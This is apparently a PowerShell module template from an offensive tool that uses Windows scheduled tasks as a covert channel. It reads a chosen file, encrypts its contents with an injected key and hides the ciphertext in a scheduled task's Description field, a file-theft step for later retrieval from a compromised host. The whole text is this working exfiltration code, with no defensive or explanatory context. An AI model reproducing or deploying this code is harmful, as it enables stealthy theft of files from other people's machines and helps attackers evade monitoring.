$target_file = "REPLACE_FILE_PATH"
$encryptionKey = [System.Convert]::FromBase64String("{key_b64}")
{common_ps}
$task = Get-ScheduledTask -TaskName "{taskname}" -TaskPath \;
# Check if file exists
if (Test-Path -Path $target_file) {{
    try {{
        # Read file content and encrypt it, then save it to task description
        # Check if file is larger than 1MB
        $fileInfo = Get-Item $target_file
        if ($fileInfo.Length -gt 1048576) {{
            $result = "[-] File is too large."
        }}else{{
            $result = Get-Content -Path $target_file -Encoding Byte
        }}
    }} catch {{
        $result = $_.Exception.Message
    }}
    

}}else{{
    $result = "[-] File not exists."
}}
$encryptedResult = Encrypt-Data $encryptionKey $result
$task.Description = $encryptedResult
Set-ScheduledTask $task
[Environment]::Exit(0)